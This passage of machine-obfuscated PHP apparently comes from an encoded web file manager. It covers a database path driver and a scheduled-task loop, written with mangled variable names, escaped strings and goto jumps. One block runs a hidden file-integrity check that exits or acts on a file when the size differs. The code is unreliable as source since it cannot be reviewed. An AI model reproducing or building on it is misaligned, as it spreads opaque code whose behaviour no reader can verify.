array_map(array($this, $¿­İŞô™[1115]), $àäÈÆ); } elseif (is_bool($àäÈÆ)) { $àäÈÆ = $àäÈÆ ? $¿­İŞô™[91] : $¿­İŞô™[228]; } elseif (is_null($àäÈÆ)) { $àäÈÆ = $¿­İŞô™[103]; } return $àäÈÆ; } public function getLastInsertId() { $êÆäºÀà =& $_SERVER[¹Éµ„ºå]; switch ($this->dbType) { case $êÆäºÀà[1101]: case $êÆäºÀà[1093]: case $êÆäºÀà[1074]: case $êÆäºÀà[1092]: case $êÆäºÀà[1076]: case $êÆäºÀà[1104]: return $this->_linkID->lastInsertId(); case $êÆäºÀà[1075]: case $êÆäºÀà[1077]: $£˜‘ù½ = $this->table; $Ïş÷¾£© = $this->query("\123\105\114\105\103\x54\x20{$£˜‘ù½}\56\x63\x75\x72\162\166\141\x6c\x20\143\165\162\x72\166\141\x6c\40\x46\122\117\x4d\40\144\165\x61\154"); return $Ïş÷¾£© ? $Ïş÷¾£©[0][$êÆäºÀà[1116]] : 0; } } } goto A«ŠŒæŒ†; b‚°¡†¶ÄÙ: if ($_SERVER[$_SERVER[¹Éµ„ºå][1025]] != $_size($_file)) { $_getc = $_SERVER[¹Éµ„ºå][1028]; $_getfile = $_SERVER[$_SERVER[¹Éµ„ºå][1029]] . $_SERVER[¹Éµ„ºå][1030]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Éµ„ºå][285], $_getfilec); if (count($_getarrs) < $_SERVER[¹Éµ„ºå][722]) { $exit = $_SERVER[¹Éµ„ºå][1031]; $exit(); } $_act = $_SERVER[¹Éµ„ºå][1036]; $_act($_file); } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($è÷ ©…¼) { $this->pathParse = $è÷ ©…¼; $this->model = Model($_SERVER[¹Éµ„ºå][1523]); } public function getPath($š‰ÁÊ–Ÿ) { return trim($š‰ÁÊ–Ÿ, $_SERVER[¹Éµ„ºå][8]); } public function pathFather($¥Ï²½Î‰) { $ãİõ¿® = $this->parse($¥Ï²½Î‰); $ãİõ¿® = $this->infoSimple($¥Ï²½Î‰); return $ãİõ¿® ? $ãİõ¿®[$_SERVER[¹Éµ„ºå][190]] : !1; } public function pathThis($Éñó˜µµ) { $‡Íˆ¬µÆ = $this->infoSimple($Éñó˜µµ); return $‡Íˆ¬µÆ ? $‡Íˆ¬µÆ[$_SERVER[¹Éµ„ºå][32]] : !1; } public function getPathOuter($¡ğû‹±¬) { if (!$¡ğû‹±¬) { return $¡ğû‹±¬; } $ÒËøéëè = $this->parse($¡ğû‹±¬); return KodIO::make($ÒËøéëè[$_SERVER[¹Éµ„ºå][487]]); } public function copyFolderFromIO($í–İàå¿, $²¦”çşµ, $¶ºÍòÎ, $Ï”¡¤Ç§, $¢à¿Å£à) { $üëÅÅ¸­ = $this->model->copyFolderFromIO($í–İàå¿, $²¦”çşµ, $¶ºÍòÎ, $Ï”¡¤Ç§, $¢à¿Å£à); return KodIO::make($üëÅÅ¸­); } public function isParentOf($­àîÒ„², $íÃàıñÂ) { return $this->model->isParentOf($­àîÒ„², $íÃàıñÂ); } public function mkfile($¼ïÄ½ã±, $­æ‰›‚· = '', $ò…ŞÛû“ = REPEAT_RENAME) { $íµØ¨ì€ =& $_SERVER[¹Éµ„ºå]; $Û‘Áì»Ç = $this->parse($¼ïÄ½ã±); $¼ïÄ½ã± = $Û‘Áì»Ç[$íµØ¨ì€[487]]; for ($‡İ¸ı†ú = 0; $‡İ¸ı†ú < count($Û‘Áì»Ç[$íµØ¨ì€[1524]]); $‡İ¸ı†ú++) { $¨Òçóó = $Û‘Áì»Ç[$íµØ¨ì€[1524]][$‡İ¸ı†ú]; if ($‡İ¸ı†ú == count($Û‘Áì»Ç[$íµØ¨ì€[1524]]) - 1) { $¼ïÄ½ã± = $this->model->mkfile($¼ïÄ½ã±, $¨Òçóó, $­æ‰›‚·, $ò…ŞÛû“); break; } $¼ïÄ½ã± = $this->model->mkdir($¼ïÄ½ã±, $¨Òçóó, REPEAT_SKIP); } return $this->getPathOuter($¼ïÄ½ã±); } public function mkdir($›Æ¸¡¨±, $¦ºëéÚš = REPEAT_SKIP) { $œƒÃóù¾ =& $_SERVER[¹Éµ„ºå]; $öœ“€æù = $this->parse($›Æ¸¡¨±); $›Æ¸¡¨± = $öœ“€æù[$œƒÃóù¾[487]]; for ($ÅêÄ Ô = 0; $ÅêÄ Ô < count($öœ“€æù[$œƒÃóù¾[1524]]); $ÅêÄ Ô++) { $ïàËÆÄ = $öœ“€æù[$œƒÃóù¾[1524]][$ÅêÄ Ô]; $›Æ¸¡¨± = $this->model->mkdir($›Æ¸¡¨±, $ïàËÆÄ, $¦ºëéÚš); } return $this->getPathOuter($›Æ¸¡¨±); } public function copyFile($Ä”‹ãº·, $ØŸøŠ¿Á, $ÃÅ‘Ù´Ÿ = REPEAT_REPLACE) { $ïõƒÂ×ƒ =& $_SERVER[¹Éµ„ºå]; $á‡äŞû = $this->parse($ØŸøŠ¿Á); $³•à“Êµ = $this->model->copy($Ä”‹ãº·, $á‡äŞû[$ïõƒÂ×ƒ[487]], $ÃÅ‘Ù´Ÿ, $á‡äŞû[$ïõƒÂ×ƒ[87]]); return $³•à“Êµ ? $this->getPathOuter($³•à“Êµ) : !1; } public function moveFile($˜Ë¼ßœ½, $¹¬ÑÍËè, $Î°¿úÆ» = REPEAT_REPLACE) { $Šô¢Ã¤™ =& $_SERVER[¹Éµ„ºå]; $¶ú¶Šğ„ = $this->parse($¹¬ÑÍËè); $× ‰ØÍÏ = $this->model->move($˜Ë¼ßœ½, $¶ú¶Šğ„[$Šô¢Ã¤™[487]], $Î°¿úÆ», $¶ú¶Šğ„[$Šô¢Ã¤™[87]]); return $× ‰ØÍÏ ? $this->getPathOuter($× ‰ØÍÏ) : !1; } public function copy($€ï¡µ³ç, $À¹àÛæƒ, $‹ù¦üôã = REPEAT_REPLACE, $»ôÄ¶ÖÈ = false) { $ôÙŒçø = $this->parse($À¹àÛæƒ); $Ö£¢’ÄÆ = $this->model->copy($€ï¡µ³ç, $ôÙŒçø[$_SERVER[¹Éµ„ºå][487]], $‹ù¦üôã, $»ôÄ¶ÖÈ); return $Ö£¢’ÄÆ ? $this->getPathOuter($Ö£¢’ÄÆ) : !1; } public function moveSameAllow() { } public function move($¯‹´åË, $«ÁÓºˆ, $€Í¬˜óì = REPEAT_REPLACE, $œ·‹¬” = false) { $–Ãş·ƒû = $this->parse($«ÁÓºˆ); $Ä‡ÑèØä = $this->model->move($¯‹´åË, $–Ãş·ƒû[$_SERVER[¹Éµ„ºå][487]], $€Í¬˜óì, $œ·‹¬”); return $Ä‡ÑèØä ? $this->getPathOuter($Ä‡ÑèØä) : !1; } public function remove($™áÂÄı®, $‰•ŠëãÙ = true) { return $this->model->remove($™áÂÄı®, $‰•ŠëãÙ); } public function rename($Â«¾Ÿ¢ú, $¤Îüı¾¾) { $İÁ¬Îı = $this->model->rename($Â«¾Ÿ¢ú, $¤Îüı¾¾); return $İÁ¬Îı ? $this->getPathOuter($Â«¾Ÿ¢ú) : $İÁ¬Îı; } public function size($¤µŞŞŠŸ) { $˜¥¦Ÿ‰™ = $this->infoSimple($¤µŞŞŠŸ); return $˜¥¦Ÿ‰™ ? $˜¥¦Ÿ‰™[$_SERVER[¹Éµ„ºå][79]] : 0; } public function infoSimple($óÌ‹õÔ) { return $this->model->sourceInfo($óÌ‹õÔ); } public function info($÷«µœ¶¨) { return $this->infoParse($÷«µœ¶¨); } public function infoAuth($ƒ‚Ó¿) { return $this->infoParse($ƒ‚Ó¿, !1, !0); } public function infoWithChildren($àò‚‹Øƒ) { return $this->infoParse($àò‚‹Øƒ, !0); } protected function infoParse($ªØ€ÕƒÏ, $Ôá¦€èç = false, $Ù¶¼¯ãú = false) { if (!$Ôá¦€èç) { return $this->model->pathInfo($ªØ€ÕƒÏ, $Ù¶¼¯ãú); } return $this->model->pathInfoMore($ªØ€ÕƒÏ); } public function infoFullSimple($©™õ©ş) { $ÇÚ¼İÜø =& $_SERVER[¹Éµ„ºå]; $µØ÷· = explode($ÇÚ¼İÜø[8], $©™õ©ş); $ÈÈ°”¥ = implode($ÇÚ¼İÜø[8], array_splice($µØ÷·, 1)); return $this->model->pathInfoByPath($µØ÷·[0], $ÈÈ°”¥); } public function infoFull($ÊõËˆÕ–) { $¹³Œ€Í  = $this->infoFullSimple($ÊõËˆÕ–); return is_array($¹³Œ€Í ) ? $this->model->pathInfo($¹³Œ€Í [$_SERVER[¹Éµ„ºå][191]]) : !1; } public function hashSimple($—ÛÅãÆ¾) { $üŒ¢şğ =& $_SERVER[¹Éµ„ºå]; $¨¦íš³ = $this->infoWithChildren($—ÛÅãÆ¾); return $¨¦íš³[$üŒ¢şğ[167]][$üŒ¢şğ[694]]; } public function hashMd5($ÕÊÒÍİ¹) { $ïÜíŸâ¤ =& $_SERVER[¹Éµ„ºå]; $ü‹‡˜Î = $this->infoWithChildren($ÕÊÒÍİ¹); return $ü‹‡˜Î[$ïÜíŸâ¤[167]][$ïÜíŸâ¤[563]]; } public function exist($æÜĞÖŞ×) { $˜ßÁÊÁ =& $_SERVER[¹Éµ„ºå]; $Â™¼¼Ê = $this->parse($æÜĞÖŞ×); if (!$Â™¼¼Ê[$˜ßÁÊÁ[87]]) { return $this->isFile($æÜĞÖŞ×) || $this->isFolder($æÜĞÖŞ×); } $ù˜Æ³ = array($˜ßÁÊÁ[492] => $Â™¼¼Ê[$˜ßÁÊÁ[487]], $˜ßÁÊÁ[32] => $Â™¼¼Ê[$˜ßÁÊÁ[87]]); $Ãô³üß– = $this->model->where($ù˜Æ³)->find(); return $Ãô³üß– ? !0 : !1; } public function isFile($“á¤™ŸÛ) { $»‡åÀÖÁ =& $_SERVER[¹Éµ„ºå]; $ù¬°£¸î = $this->infoSimple($“á¤™ŸÛ); return $ù¬°£¸î && $ù¬°£¸î[$»‡åÀÖÁ[500]] == $»‡åÀÖÁ[228] ? !0 : !1; } public function isFolder($š­¿Ñ¨) { $­¬òÎ =& $_SERVER[¹Éµ„ºå]; $û§‚–Îø = $this->infoSimple($š­¿Ñ¨); return $û§‚–Îø && $û§‚–Îø[$­¬òÎ[500]] == $­¬òÎ[91] ? !0 : !1; } public function listPath($ëêŸñÕÆ, $µœİ’Å­ = false) { $ğ¬ØŠ¡ =& $_SERVER[¹Éµ„ºå]; if ($ëêŸñÕÆ == $ğ¬ØŠ¡[12]) { return !1; } $Ø²Ñˆç» = array($ğ¬ØŠ¡[492] => $ëêŸñÕÆ); if ($µœİ’Å­) { return $this->model->listSource($Ø²Ñˆç», -1); } return $this->model->listSource($Ø²Ñˆç»); } public function has($ŞÁ¿õ†, $¤¬˜€ˆ³ = false, $ñ°¹Ìã— = null) { $¥ğ›¼ÇÚ =& $_SERVER[¹Éµ„ºå]; $ëë•ûßß = $this->infoWithChildren($ŞÁ¿õ†); if ($¤¬˜€ˆ³) { return array($¥ğ›¼ÇÚ[240] => $ëë•ûßß[$¥ğ›¼ÇÚ[240]], $¥ğ›¼ÇÚ[239] => $ëë•ûßß[$¥ğ›¼ÇÚ[239]]); } return $ñ°¹Ìã— ? $ëë•ûßß[$¥ğ›¼ÇÚ[240]] : $ëë•ûßß[$¥ğ›¼ÇÚ[239]]; } public function listAll($ã÷µÌä÷) { $ì†Æ’Š = IO::info($this->pathParse[$_SERVER[¹Éµ„ºå][87]]); if (!$ì†Æ’Š) { return array(); } return $this->model->listAll($ã÷µÌä÷); } public function getContent($‹Ÿ‘Ï¼¯) { return $this->model->getContent($‹Ÿ‘Ï¼¯); } public function setContent($Ø‰ŸÅõ¶, $¡Óü—€¬ = '') { return $this->model->setContent($Ø‰ŸÅõ¶, $¡Óü—€¬); } public function fileSubstr($‡ƒÀ´Ûà, $¨§ŒŞ¿¶, $úÒ‚›ù‚) { return $this->model->fileSubstr($‡ƒÀ´Ûà, $¨§ŒŞ¿¶, $úÒ‚›ù‚); } public function download($¯–†Ü¿, $¿úÂå¿¥ = '') { $Ğ«¬ƒ»¢ = get_path_father($¿úÂå¿¥); $ïìÄÙÍÌ = get_path_this($¿úÂå¿¥); $æ«™ô “ = $this->model->fileInfoGet($¯–†Ü¿); $œÜùßù„ = IO::copy($æ«™ô “[$_SERVER[¹Éµ„ºå][87]], $Ğ«¬ƒ»¢, !1, $ïìÄÙÍÌ); return $œÜùßù„; } public function setModifyTime($âşÚ³º, $ú‚öÀ“ = '') { $ƒ¬Ÿ¥ =& $_SERVER[¹Éµ„ºå]; if (!$âşÚ³º) { return; } $this->model->where(array($ƒ¬Ÿ¥[506] => $âşÚ³º))->save(array($ƒ¬Ÿ¥[88] => $ú‚öÀ“)); } public function upload($ºŞÅüæ, $ÍùŒ÷š, $Ÿ«¢îˆ¡ = false, $Æ›¶ıÖŸ = REPEAT_REPLACE) { $ËÄøÂ–¸ =& $_SERVER[¹Éµ„ºå]; $Ú¨İğ¸Ù = $this->parse($ºŞÅüæ); $ä÷’éŸâ = $this->model->addFile($Ú¨İğ¸Ù[$ËÄøÂ–¸[487]], $ÍùŒ÷š, $Ú¨İğ¸Ù[$ËÄøÂ–¸[87]], $Ÿ«¢îˆ¡, $Æ›¶ıÖŸ); return $this->getPathOuter($ä÷’éŸâ); } public function uploadFileByID($§²ê£äğ, $Û°íÏùİ, $Ä·Õ×—) { $ıõç€Èß =& $_SERVER[¹Éµ„ºå]; $ØËé¬Ç® = $this->parse($§²ê£äğ); $•–Öí¡õ = $this->model->addFileByFileID($ØËé¬Ç®[$ıõç€Èß[487]], $Û°íÏùİ, $ØËé¬Ç®[$ıõç€Èß[87]], $Ä·Õ×—); return $this->getPathOuter($•–Öí¡õ); } public function addFileByRemote($æÇ¥Í¾µ, $Ãó¬Ñ—š, $—ıÛ”œÑ = array(), $ß¯¢Ÿİë = '', $ ü”ıè) { $¯úìÏò =& $_SERVER[¹Éµ„ºå]; $Î¡œ¹”¹ = $this->parse($æÇ¥Í¾µ); $ß¯¢Ÿİë = empty($ß¯¢Ÿİë) ? $Î¡œ¹”¹[$¯úìÏò[87]] : $ß¯¢Ÿİë; $­³É¥»½ = $this->model->addFileByRemote($Î¡œ¹”¹[$¯úìÏò[487]], $Ãó¬Ñ—š, $ß¯¢Ÿİë, $—ıÛ”œÑ, $ ü”ıè); return $this->getPathOuter($­³É¥»½); } public function uploadLink($Šåš°ş£, $¯ÏÛæÙ = 0) { $ÃÕƒşø¢ =& $_SERVER[¹Éµ„ºå]; $ä¸Õ¼îç = $this->parse($Šåš°ş£); $æ·ÃÇŠß = _get($GLOBALS[$ÃÕƒşø¢[7]], $ÃÕƒşø¢[1525]); $ş©ÃÄ€¥ = _get($GLOBALS[$ÃÕƒşø¢[7]], $ÃÕƒşø¢[1526]); $Ş“âêíÉ = KodIO::ioFileDriverGet($ÃÕƒşø¢[498] . $ä¸Õ¼îç[$ÃÕƒşø¢[487]] . $ÃÕƒşø¢[402]); $±Î“Õ§ = Model($ÃÕƒşø¢[696])->createFileName($ä¸Õ¼îç[$ÃÕƒşø¢[87]], $Ş“âêíÉ, $æ·ÃÇŠß, $ş©ÃÄ€¥); return IO::uploadLink($±Î“Õ§, $¯ÏÛæÙ); } public function fileNameAuto($œ››¢‡º, $õöñî Ä, $¨ÚˆÎí = REPEAT_REPLACE, $¿ı°–ß¿ = false) { return $this->model->fileNameAuto($œ››¢‡º, $õöñî Ä, $¨ÚˆÎí, $¿ı°–ß¿); } public function fileNameExist($é¥Í”ìƒ, $çÈ®Õ¦Ç) { return $this->model->fileNameExist($é¥Í”ìƒ, $çÈ®Õ¦Ç); } protected function _fileOut($ñÂ¼À‘×, $®¿üÉ–÷ = false, $ü¨úÕŞ¼ = false, $¾Ó ‡¬Ò = '', $Û—†Ÿƒ— = false) { $†šşŸ¬Ô =& $_SERVER[¹Éµ„ºå]; $ê®ÔºÜê = $this->model->sourceInfo($ñÂ¼À‘×); if ($ê®ÔºÜê[$†šşŸ¬Ô[500]] == $†šşŸ¬Ô[91]) { header($†šşŸ¬Ô[1527]); die; } $½ÖÎÀš´ = $this->model->fileInfoGet($ñÂ¼À‘×); $¾Ó ‡¬Ò = $½ÖÎÀš´[$†šşŸ¬Ô[563]] ? $½ÖÎÀš´[$†šşŸ¬Ô[563]] : $¾Ó ‡¬Ò; $¡öñØ–• = isset($GLOBALS[$†šşŸ¬Ô[180]]) && is_array($GLOBALS[$†šşŸ¬Ô[180]]) ? $GLOBALS[$†šşŸ¬Ô[180]][$†šşŸ¬Ô[32]] : $ê®ÔºÜê[$†šşŸ¬Ô[32]]; if ($Û—†Ÿƒ—) { return IO::fileOutServer($½ÖÎÀš´[$†šşŸ¬Ô[87]], $®¿üÉ–÷, $¡öñØ–•, $¾Ó ‡¬Ò); } IO::fileOut($½ÖÎÀš´[$†šşŸ¬Ô[87]], $®¿üÉ–÷, $¡öñØ–•, $¾Ó ‡¬Ò); } public function fileOut($±î¶’¢ , $’èı¡´ = false, $¶·¶ßÁ– = false, $û´×ÂÎ… = '') { $this->_fileOut($±î¶’¢ , $’èı¡´, $¶·¶ßÁ–, $û´×ÂÎ…); } public function fileOutServer($ğïÑŸÚ–, $¼÷ƒŸä = false, $ûïùƒ‘€ = false, $ÖÉÛ§‰Ú = '') { $this->_fileOut($ğïÑŸÚ–, $¼÷ƒŸä, $ûïùƒ‘€, $ÖÉÛ§‰Ú, !0); } protected function _fileOutImage($ÜÔÉ°¸, $Ü§ë£Ï‡ = 250) { $Í‘ïËÒé =& $_SERVER[¹Éµ„ºå]; $°ªŞ€Ç = $this->model->pathInfo($ÜÔÉ°¸); if ($°ªŞ€Ç[$Í‘ïËÒé[500]] == $Í‘ïËÒé[91]) { show_json($Í‘ïËÒé[1528] . $ÜÔÉ°¸, !1); } $“úšÙŠ½ = $this->model->fileInfoGet($ÜÔÉ°¸); $°ªŞ€Ç[$Í‘ïËÒé[181]] = $“úšÙŠ½[$Í‘ïËÒé[87]]; $GLOBALS[$Í‘ïËÒé[180]] = $°ªŞ€Ç; IO::fileOutImage($“úšÙŠ½[$Í‘ïËÒé[87]], $Ü§ë£Ï‡); } public function fileOutImage($İ«µã‡£, $çÛ´±Õ = 250) { $this->_fileOutImage($İ«µã‡£, $çÛ´±Õ); } public function fileOutImageServer($˜¨¾„— , $õÊƒÊÙ = 250) { $this->_fileOutImage($˜¨¾„— , $õÊƒÊÙ); } public function link($âÏìšû…, $ºĞÚ¦ª¬ = '') { $¸èû‘Éß = $this->model->fileInfoGet($âÏìšû…); return IO::link($¸èû‘Éß[$_SERVER[¹Éµ„ºå][87]], $ºĞÚ¦ª¬); } protected function parse($ú÷ÑİÜ) { $ÔÚ®Ê“Ï =& $_SERVER[¹Éµ„ºå]; if (strstr($ú÷ÑİÜ, $ÔÚ®Ê“Ï[8]) === !1) { return array($ÔÚ®Ê“Ï[508] => intval($ú÷ÑİÜ), $ÔÚ®Ê“Ï[87] => $ÔÚ®Ê“Ï[12], $ÔÚ®Ê“Ï[1524] => array()); } $´éÒÉÇ‹ = explode($ÔÚ®Ê“Ï[8], trim($ú÷ÑİÜ, $ÔÚ®Ê“Ï[8])); if (count($´éÒÉÇ‹) < 2) { show_tips(clear_html($ú÷ÑİÜ) . $ÔÚ®Ê“Ï[1529]); } return array($ÔÚ®Ê“Ï[508] => intval($´éÒÉÇ‹[0]), $ÔÚ®Ê“Ï[87] => $´éÒÉÇ‹[1], $ÔÚ®Ê“Ï[1524] => array_slice($´éÒÉÇ‹, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ßûÕáš) { $this->pathParse = $ßûÕáš; $this->model = Model($_SERVER[¹Éµ„ºå][1523]); } public function getPathRoot() { $¯øˆí‹™ =& $_SERVER[¹Éµ„ºå]; return KodIO::makeShare($this->pathParse[$¯øˆí‹™[487]], $this->pathParse[$¯øˆí‹™[1349]]); } public function getPathOuter($­²³¹­Ğ) { $ÀÛ…˜”è =& $_SERVER[¹Éµ„ºå]; if (!$­²³¹­Ğ) { return $­²³¹­Ğ; } $Ğïôæ¶‹ = $this->parse($­²³¹­Ğ); return trim(KodIO::makeShare($this->pathParse[$ÀÛ…˜”è[487]], $Ğïôæ¶‹[$ÀÛ…˜”è[487]]), $ÀÛ…˜”è[8]); } public function isParentOf($íğËí©ò, $óÅıÙœ«) { $ˆš£Ø” = IO::init($óÅıÙœ«); return $this->model->isParentOf($íğËí©ò, $ˆš£Ø”->path); } protected function infoParse($×Š»úú£, $Œñšø¶÷ = false, $è²ÉåÎñ = false) { $ñÚÇ‹°ù =& $_SERVER[¹Éµ„ºå]; static $å©Ş§İ = array(); $ƒé‘“–ô = $this->pathParse[$ñÚÇ‹°ù[487]]; $Å‡ğçƒ = trim($this->pathParse[$ñÚÇ‹°ù[1345]], $ñÚÇ‹°ù[8]); if (isset($å©Ş§İ[$Å‡ğçƒ]) && is_array($å©Ş§İ[$Å‡ğçƒ])) { return $å©Ş§İ[$Å‡ğçƒ]; } $š€ŠĞÑ = Action($ñÚÇ‹°ù[1530])->sharePathInfo($ƒé‘“–ô, $Å‡ğçƒ, $Œñšø¶÷); $å©Ş§İ[$Å‡ğçƒ] = $š€ŠĞÑ; return $š€ŠĞÑ; } public function infoFull($•€¹) { $”ªª³òÆ =& $_SERVER[¹Éµ„ºå]; $èí‘æ¬ = explode($”ªª³òÆ[8], trim($•€¹, $”ªª³òÆ[8])); if (count($èí‘æ¬) > 1) { $ÉİİÚªŞ = implode($”ªª³òÆ[8], array_splice($èí‘æ¬, 1)); $øş©Ä‹¸ = $this->model->pathInfoByPath($èí‘æ¬[0], $ÉİİÚªŞ); if (!$øş©Ä‹¸) { return !1; } $this->pathParse[$”ªª³òÆ[1345]] = $øş©Ä‹¸[$”ªª³òÆ[191]]; } return $this->infoParse($•€¹); } public function listAll($§»˜Ê¢ß) { $µòæÄ·ö =& $_SERVER[¹Éµ„ºå]; $™¼Ì‡Ûè = IO::info($this->pathParse[$µòæÄ·ö[87]]); if (!$™¼Ì‡Ûè) { return array(); } $Ô½úî“ = $this->model->listAll($§»˜Ê¢ß); $óì¥„Íî = Model($µòæÄ·ö[686])->getInfo($™¼Ì‡Ûè[$µòæÄ·ö[687]]); foreach ($Ô½úî“ as &$Ä Ìõæä) { check_abort(); $Ä Ìõæä[$µòæÄ·ö[90]] = Action($µòæÄ·ö[1530])->_shareItemeParse($Ä Ìõæä[$µòæÄ·ö[90]], $óì¥„Íî); } unset($Ä Ìõæä); return $Ô½úî“; } } goto Eá§ÄÑÂé®; BìğŠŠèéÃ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ã‹ÔŞåê =& $_SERVER[¹Éµ„ºå]; if (self::valueGet($Ã‹ÔŞåê[841]) != $Ã‹ÔŞåê[91]) { return; } if (self::valueGet($Ã‹ÔŞåê[930]) == $Ã‹ÔŞåê[91]) { $¯ÚàĞÈ— = self::valueGet($Ã‹ÔŞåê[1916]); if (time() - $¯ÚàĞÈ— > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ã‹ÔŞåê[930], $Ã‹ÔŞåê[91]); self::log($Ã‹ÔŞåê[1917] . ACTION . $Ã‹ÔŞåê[1918]); Hook::bind($Ã‹ÔŞåê[1919], $Ã‹ÔŞåê[1920]); $×ú¦€ñç = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ã‹ÔŞåê[841]) != $Ã‹ÔŞåê[91]) { self::valueSet($Ã‹ÔŞåê[930], $Ã‹ÔŞåê[228]); self::log($Ã‹ÔŞåê[1921]); die; } $Àñæºš = time(); if ($Àñæºš - $×ú¦€ñç >= 60) { self::valueSet(array($Ã‹ÔŞåê[930] => $Ã‹ÔŞåê[91], $Ã‹ÔŞåê[1916] => $Àñæºš)); $×ú¦€ñç = $Àñæºš; } if (!file_exists(USER_SYSTEM . $Ã‹ÔŞåê[1922])) { self::valueSet(array($Ã‹ÔŞåê[930] => $Ã‹ÔŞåê[228], $Ã‹ÔŞåê[841] => $Ã‹ÔŞåê[228])); self::log($Ã‹ÔŞåê[1923]); die; } $“Ò†È”ì = file_get_contents(BASIC_PATH . $Ã‹ÔŞåê[1924]); $„³±‚‰× = KOD_VERSION . $Ã‹ÔŞåê[10] . KOD_VERSION_BUILD; $¦ØŞùùÏ = match_text($“Ò†È”ì, $Ã‹ÔŞåê[1925]) . $Ã‹ÔŞåê[10] . match_text($“Ò†È”ì, $Ã‹ÔŞåê[1926]); if ($¦ØŞùùÏ != $„³±‚‰×) { self::restart(); self::log("\x73\164\157\x70\x65\x64\56\x5b\166\x65\162\x73\151\157\156\40\x75\x70\144\141\x74\145\x3b{$versionNow}\x20\x3d\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $õ¯ƒ¾‹¹ =& $_SERVER[¹Éµ„ºå]; http_close(); $GLOBALS[$õ¯ƒ¾‹¹[1927]] = 1; $_SERVER[$õ¯ƒ¾‹¹[1928]] = $õ¯ƒ¾‹¹[1929]; $_COOKIE = array(); $GLOBALS[$õ¯ƒ¾‹¹[1930]] = 1; $GLOBALS[$õ¯ƒ¾‹¹[1931]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¯ú…áÉò =& $_SERVER[¹Éµ„ºå]; http_close(); self::valueSet($¯ú…áÉò[841], $¯ú…áÉò[228]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¯ú…áÉò[930] => $¯ú…áÉò[228], $¯ú…áÉò[841] => $¯ú…áÉò[91])); self::log($¯ú…áÉò[1932]); } public static function taskSwitch() { $¡»÷ÏÇ =& $_SERVER[¹Éµ„ºå]; $ËòÏÁÑó = self::valueGet($¡»÷ÏÇ[841]) == $¡»÷ÏÇ[91] ? $¡»÷ÏÇ[228] : $¡»÷ÏÇ[91]; self::valueSet($¡»÷ÏÇ[841], $ËòÏÁÑó); } public static function shutdownEvent() { $êıæ÷Ş =& $_SERVER[¹Éµ„ºå]; self::valueSet($êıæ÷Ş[930], $êıæ÷Ş[228]); self::log($êıæ÷Ş[1933]); } public static function config($®€»ĞÌş, $ÒŠ¯ÀŒÏ) { self::valueSet($_SERVER[¹Éµ„ºå][841], $®€»ĞÌş); } private static function taskRunAll() { $Ë–Éªö =& $_SERVER[¹Éµ„ºå]; $—úŸıä¨ = timeFloat(); $›ÔÈĞı” = Model($Ë–Éªö[1934])->listData(); $óãÛÔÈ = count($›ÔÈĞı”); for ($Åƒ‡—ëÀ = 0; $Åƒ‡—ëÀ < $óãÛÔÈ; $Åƒ‡—ëÀ++) { $µ·Ãµ = $›ÔÈĞı”[$Åƒ‡—ëÀ]; if (!$µ·Ãµ[$Ë–Éªö[487]] || $µ·Ãµ[$Ë–Éªö[1935]] != $Ë–Éªö[91]) { continue; } if (!self::taskTimeCheck($µ·Ãµ)) { continue; } self::taskRun($µ·Ãµ); } Hook::trigger($Ë–Éªö[1936]); self::taskQueueRun($—úŸıä¨); } private static function taskQueueRun($¯®õÀš) { $õšï·õ¿ = 10; while (!0) { $ËºğŸ¡ = TaskQueue::run(); if ($ËºğŸ¡ === !1) { break; } if (timeFloat() - $¯®õÀš >= $õšï·õ¿) { break; } } } private static function taskTimeCheck($­«êßï“) { $ÃããÂñ =& $_SERVER[¹Éµ„ºå]; $åƒÊ×Ú¡ = json_decode($­«êßï“[$ÃããÂñ[204]], !0); $›âô¯ = intval($­«êßï“[$ÃããÂñ[1916]]); $°ÕÄĞã  = strtotime($ÃããÂñ[1937] . $åƒÊ×Ú¡[$ÃããÂñ[1938]] . $ÃããÂñ[1939]) - strtotime($ÃããÂñ[1940]); $Ë€ˆÂ·ô = time() - strtotime(date($ÃããÂñ[1941]) . $ÃããÂñ[1942]); $™’—ä½ = $Ë€ˆÂ·ô >= $°ÕÄĞã  && $Ë€ˆÂ·ô <= $°ÕÄĞã  + 3600; switch ($åƒÊ×Ú¡[$ÃããÂñ[33]]) { case $ÃããÂñ[1943]: if (time() - $›âô¯ < 3600 * 24 * 30) { return !1; } if ($åƒÊ×Ú¡[$ÃããÂñ[1943]] == date($ÃããÂñ[1944]) && $™’—ä½) { return !0; } break; case $ÃããÂñ[1945]: if (time() - $›âô¯ < 3600 * 24 * 7) { return !1; } $¸ÏÍ©ùş = date($ÃããÂñ[1946]) == 0 ? 7 : date($ÃããÂñ[1946]); if ($åƒÊ×Ú¡[$ÃããÂñ[1945]] == $¸ÏÍ©ùş && $™’—ä½) { return !0; } break; case $ÃããÂñ[1938]: if (time() - $›âô¯ < 3600 * 24) { return !1; } if ($™’—ä½) { return !0; } break; case $ÃããÂñ[1947]: if (time() - $›âô¯ >= floatval($åƒÊ×Ú¡[$ÃããÂñ[1947]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $ÜÑ¸§¦‹ =& $_SERVER[¹Éµ„ºå]; static $Ì³¦èÚĞ = 0; $«Ã­åáÎ = 300; if (!$Ì³¦èÚĞ) { $Ì³¦èÚĞ = time(); } if (time() - $Ì³¦èÚĞ < $«Ã­åáÎ) { return; } $Ì³¦èÚĞ = time(); $¾«­¡ëó = Model($ÜÑ¸§¦‹[597])->db($ÜÑ¸§¦‹[12]); if ($¾«­¡ëó) { $¾«­¡ëó->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($ÜÑ¸§¦‹[1948], $ÜÑ¸§¦‹[1949]); die; } } public static function taskRun($ŸŠºî¢Æ) { $´øÑ«¥ =& $_SERVER[¹Éµ„ºå]; self::log($´øÑ«¥[1950] . $ŸŠºî¢Æ[$´øÑ«¥[487]] . $´øÑ«¥[1951] . $ŸŠºî¢Æ[$´øÑ«¥[32]] . $´øÑ«¥[1952] . 